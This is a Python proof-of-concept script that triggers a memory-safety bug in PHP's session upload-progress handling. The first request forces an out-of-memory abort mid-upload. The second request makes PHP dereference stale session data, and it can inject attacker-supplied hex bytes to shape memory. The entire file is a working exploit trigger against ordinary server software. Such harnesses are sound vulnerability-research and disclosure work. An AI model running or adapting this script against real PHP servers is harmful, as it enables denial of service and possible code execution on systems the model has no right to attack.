#!/usr/bin/env python3
"""Minimal session.upload_progress cross-request trigger harness.

Request A: multipart with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS + a file part
           (starts the session) followed by a huge field that forces OOM.
Request B: multipart with PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS but NO file
           part, so MULTIPART_EVENT_END -> php_session_rfc1867_cleanup() ->
           php_session_initialize() -> php_session_track_init() dereferences
           the stale PS(http_session_vars) left by request A.
"""
import os
import socket
import sys
import time

HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", "8088"))
PATH = os.environ.get("PATH_INFO", "/index.php")
SID = os.environ.get("SID", "attacksessionid0001")
TIMEOUT = float(os.environ.get("IO_TIMEOUT", "15"))


def multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        if "filename" in p:
            out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"; filename="' + p["filename"].encode() + b'"\r\n'
            out += b"Content-Type: application/octet-stream\r\n\r\n"
        else:
            out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"\r\n\r\n'
        out += p["data"]
        out += b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def send(body, boundary, timeout=TIMEOUT):
    hdr = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    s.settimeout(timeout)
    send_err = None
    try:
        s.sendall(hdr)
        # chunked send so a server-side abort does not raise immediately
        mv = memoryview(body)
        for off in range(0, len(body), 262144):
            try:
                s.sendall(mv[off:off + 262144])
            except OSError as e:
                send_err = repr(e)
                break
    except OSError as e:
        send_err = repr(e)
    data = bytearray()
    recv_err = None
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except OSError as e:
        recv_err = repr(e)
    finally:
        s.close()
    return bytes(data), send_err, recv_err


def req_a(huge_mb=12, boundary=b"----SUPABOUNDARY7"):
    parts = [
        {"name": "PHPSESSID", "data": SID.encode()},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (huge_mb * 1024 * 1024)},
    ]
    return multipart(parts, boundary), boundary


def req_b(boundary=b"BNDRY12345", pad=None):
    parts = [
        {"name": "PHPSESSID", "data": SID.encode()},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    ref = os.environ.get("B_REF_HEX")
    ht = os.environ.get("B_HT_HEX")
    if ref:
        parts.append({"name": "ref", "data": bytes.fromhex(ref)})
    if ht:
        parts.append({"name": "ht", "data": bytes.fromhex(ht)})
    if pad:
        parts.append({"name": "pad", "data": pad})
    return multipart(parts, boundary), boundary


def show(tag, resp, send_err, recv_err):
    head = resp.split(b"\r\n\r\n", 1)[0] if b"\r\n\r\n" in resp else resp
    print(f"--- {tag} ---")
    print("send_err:", send_err, "recv_err:", recv_err)
    print(head[:600].decode("latin1", "replace"))
    body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""
    print("body:", body[:400].decode("latin1", "replace"))


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "ab"
    if mode in ("a", "ab"):
        body, bnd = req_a(int(os.environ.get("HUGE_MB", "12")))
        print(f"[A] body={len(body)} boundary={bnd!r}")
        show("A", *send(body, bnd))
        time.sleep(0.5)
    if mode in ("b", "ab"):
        pad = os.environ.get("PAD", "").encode() or None
        body, bnd = req_b(pad=pad)
        print(f"[B] body={len(body)} boundary={bnd!r}")
        show("B", *send(body, bnd))


if __name__ == "__main__":
    main()
